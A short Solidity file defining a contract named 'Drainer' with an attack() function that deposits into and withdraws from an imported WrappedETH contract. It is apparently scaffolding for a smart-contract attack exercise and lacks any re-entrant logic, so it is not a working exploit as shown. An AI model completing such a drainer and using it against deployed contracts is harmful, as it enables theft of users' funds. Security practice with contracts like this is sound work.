// SPDX-License-Identifier: MIT

pragma solidity 0.8.30;

import {WrappedETH} from "./WrappedETH.sol";

contract Drainer {
    WrappedETH wrappedETH;

    function setContractAddress(WrappedETH _contractAddress) public {
        wrappedETH = _contractAddress;
    }

    function attack() public payable {
        wrappedETH.deposit();
    }

    function withdrawETH(uint8 _amount) public {
        wrappedETH.withdraw(_amount);
    }
}